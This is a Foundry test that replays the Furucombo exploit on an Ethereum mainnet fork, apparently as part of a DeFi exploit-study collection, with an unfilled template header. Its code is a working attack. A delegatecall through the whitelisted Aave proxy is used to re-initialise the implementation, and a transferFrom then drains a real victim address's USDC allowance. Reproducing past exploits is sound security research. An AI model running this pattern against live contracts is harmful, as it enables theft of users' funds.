// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
import {IERC20} from "../interfaces/IERC20.sol";
import {IWETH9} from '../interfaces/IWETH9.sol';

// forge test --match-contract Exploit_Furucombo -vvv
/*
On DATE an attacker stole AMOUNT in TYPE tokens from an PROTOCOL.


// Attack Overview
Total Lost: 
Attack Tx: 
Ethereum Transaction Viewer: 

Exploited Contract: 
Attacker Address: 
Attacker Contract: 
Attack Block:  

// Key Info Sources
Twitter: https://twitter.com/furucombo/status/1365743633605959681
Writeup: 
Article: 
Code: 


Principle: VULN PRINCIPLE


ATTACK:
1)

MITIGATIONS:
1)

*/

interface IRegistry {
    function infos(address) external view returns (bytes32);

    function isValid(address handler) external view returns (bool result);
}

/**
 * @title The entrance of Furucombo
 * @author Ben Huang
 */
interface IProxy {
    /**
     * @notice Combo execution function. Including three phases: pre-process,
     * exection and post-process.
     * @param tos The handlers of combo.
     * @param configs The configurations of executing cubes.
     * @param datas The combo datas.
     */
    function batchExec(
        address[] memory tos,
        bytes32[] memory configs,
        bytes[] memory datas
    ) external;
}

// https://etherscan.io/address/0x7d2768de32b0b80b7a3454c06bdac94a69ddc7a9#code
interface IAaveV2Proxy {
    function initialize(address _logic, bytes memory _data) external payable;
}

contract Exploit_Furucombo is TestHarness, TokenBalanceTracker {
    address internal victim = 0x13f6f084e5fadED2276def5149E71811A7AbEb69;

    IProxy internal furucomboProxy = IProxy(0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f);
    IAaveV2Proxy internal aaveV2Proxy = IAaveV2Proxy(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    IERC20 internal usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // From deployment constructor https://etherscan.io/address/0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f#code
    IRegistry internal furucomboRegistry = IRegistry(0xd4258B13C9FADb7623Ca4b15DdA34b7b85b842C7);

    address attacker = address(0x69);

    function setUp() external {
        cheat.createSelectFork("mainnet", 11940499); 

        cheat.deal(address(this), 0);

        addTokenToTracker(address(usdc));

        logBalancesWithLabel('Attacker', tx.origin);
        updateBalanceTracker(address(this));
        updateBalanceTracker(victim);

    }

    function test_attack() external {

        // Check that the malicious implementation is not valid (yet)
        console.log("Check if Aave Proxy is valid initially:", furucomboRegistry.isValid(address(aaveV2Proxy)));
        console.log("Check victims allowance:", usdc.allowance(victim, address(furucomboProxy)));
        console.log("\n");

        console.log("==== STEP 1: Initialize this as proxy ====");
        address[] memory tos = new address[](1);
        tos[0] = address(aaveV2Proxy);

        bytes32[] memory configs = new bytes32[](1);

        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodeWithSelector(
            aaveV2Proxy.initialize.selector,
            address(this),
            ""
        );

        furucomboProxy.batchExec(tos, configs, datas);

        logBalancesWithLabel('Attacker', tx.origin);
        logBalancesWithLabel('Attacker Contract', address(this));
        logBalancesWithLabel('Victim', victim);

        console.log("==== STEP 2: Execute Attack (transferFrom) ====");
        cheat.prank(attacker);
        executeTransferFrom();
        logBalancesWithLabel('Attacker', tx.origin);
        logBalancesWithLabel('Attacker Contract', address(this));
        logBalancesWithLabel('Victim', victim);
    }

    function executeTransferFrom() internal {
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        tos[0] = address(aaveV2Proxy);
        datas[0] = abi.encodeWithSelector(
            this.doTransferFrom.selector,
            usdc,
            victim
        );
        // aaveV2Proxy is whitelisted and passes registry._isValid(aaveV2Proxy)
        // then delegatecalls to aaveV2Proxy.fallback
        // which delegatecalls again to its implementation address
        // which was changed in setup to "this"
        // meaning furucombo delegatecalls to this.attackDelegated
        furucomboProxy.batchExec(tos, configs, datas);
    }

    function doTransferFrom(IERC20 token, address sender) external payable {
        token.transferFrom(sender, tx.origin, token.balanceOf(sender));
    }
}
